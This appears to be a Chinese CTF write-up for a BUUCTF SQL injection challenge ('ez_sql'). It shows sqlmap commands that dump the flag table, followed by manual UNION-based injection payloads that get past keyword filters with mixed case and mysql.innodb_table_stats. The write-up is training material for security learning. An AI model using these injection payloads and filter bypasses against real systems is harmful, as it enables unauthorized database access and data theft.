## ez_sql

> 首先由题目可以知道，这是一个sql注入题

![image-20240822105458179](https://gitee.com/bx33661/image/raw/master/path/image-20240822105458179.png)

随便点击一个页面，发现类似注入点`id`

```
http://5b504731-96a4-476f-a0cf-a500c888deea.node5.buuoj.cn:81/?id=TMP0919
```

- 使用sqlmap直接获取flag

```bash
python sqlmap.py -u"http://5b504731-96a4-476f-a0cf-a500c888deea.node5.buuoj.cn:81/?id=1" --dbs

python sqlmap.py -u"http://5b504731-96a4-476f-a0cf-a500c888deea.node5.buuoj.cn:81/?id=1" -D ctf --tables

python sqlmap.py -u"http://5b504731-96a4-476f-a0cf-a500c888deea.node5.buuoj.cn:81/?id=1" -D ctf -T here_is_flag --dump
```

- 手工注入

首先发现有过滤，这里采用大小写绕过

```bash
?id=-1%27%20union%20Select%201,2,3,4,5%20--+    
?id=-1' union Select database(),2,3,4,5 --+     
```

> 从网上学习:
>
> 然后经过再次测试，发现`information_schema.tables`和`where`都被过滤了
> 这里用`mysql.innodb_table_stats`和`wHere`代替
> （多次尝试，发现回显的位置在5而不是1，开始卡了很久没回显）
> 爆表名

```bash
?id=-1' union SelECt 1,2,3,4,group_concat(table_name) from mysql.innodb_table_stats wHere '1 --+
```

```bash
?id=-1' union SelECt 1,2,3,4,group_concat(`1`) from (SelECt 1 union SelECt * from ctf.here_is_flag)a wHere '1 --+
```

